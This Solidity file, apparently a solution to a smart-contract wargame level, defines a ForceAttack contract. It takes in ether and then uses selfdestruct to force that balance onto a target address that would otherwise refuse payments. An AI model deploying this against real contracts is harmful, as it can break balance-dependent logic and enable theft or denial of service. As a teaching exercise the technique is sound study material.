// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract ForceAttack {
  function attack(address payable _target) external {
    selfdestruct(_target);
  }
  
  receive() external payable {}
}